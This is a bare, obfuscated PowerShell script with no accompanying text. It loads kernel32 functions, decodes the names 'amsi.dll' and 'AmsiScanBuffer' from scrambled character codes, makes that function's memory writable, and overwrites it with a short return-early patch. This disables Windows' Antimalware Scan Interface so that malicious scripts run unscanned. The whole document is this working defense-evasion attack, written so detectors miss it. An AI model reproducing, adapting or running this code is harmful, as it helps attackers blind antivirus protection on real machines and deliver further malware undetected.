$eJLXKAHK = @"
using System;
using System.Runtime.InteropServices;
public class eJLXKAHK {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr c624f8Td4vWrCab, string DbEXHfgqS4);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr pLcaX2Ztrg82gcnLaz, UIntPtr l8mUzkQcon_, uint NwoFy6, out uint n_3);
}
"@

Add-Type $eJLXKAHK

$CmsBiWU8k2 = [eJLXKAHK]::LoadLibrary("$([cHar]([ByTe]0x61)+[cHar]([Byte]0x6d)+[chaR]([bYTE]0x73)+[cHAR]([BYtE]0x69)+[CHAr]([byTe]0x2e)+[CHAR]([bYTe]0x64)+[CHar](24+84)+[ChaR]([ByTe]0x6c))")
$oQIMxm4Umqmh = [eJLXKAHK]::GetProcAddress($CmsBiWU8k2, "$([cHaR](65)+[ChAr](94+15)+[CHar](88+27)+[char]([bYtE]0x69)+[CHAr]([byte]0x53)+[chaR](99+17-17)+[cHAR](97*12/12)+[ChAr](110)+[ChAR]([byTE]0x42)+[chAr]([byTe]0x75)+[cHAR]([Byte]0x66)+[chAr](102)+[CHAr](101*21/21)+[cHAr](82+32))")
$p = 0
[eJLXKAHK]::VirtualProtect($oQIMxm4Umqmh, [uint32]5, 0x40, [ref]$p)
$DXVtE = "0xB8"
$mE4faz2 = "0x57"
$i9crUvhbZk6Fbn0r = "0x00"
$KcEatLWxg3DY = "0x07"
$digxmt44VRvgP = "0x80"
$mh6 = "0xC3"
$qrsl8mHTMx_fht9Sfr = [Byte[]] ($DXVtE,$mE4faz2,$i9crUvhbZk6Fbn0r,$KcEatLWxg3DY,+$digxmt44VRvgP,+$mh6)
[System.Runtime.InteropServices.Marshal]::Copy($qrsl8mHTMx_fht9Sfr, 0, $oQIMxm4Umqmh, 6)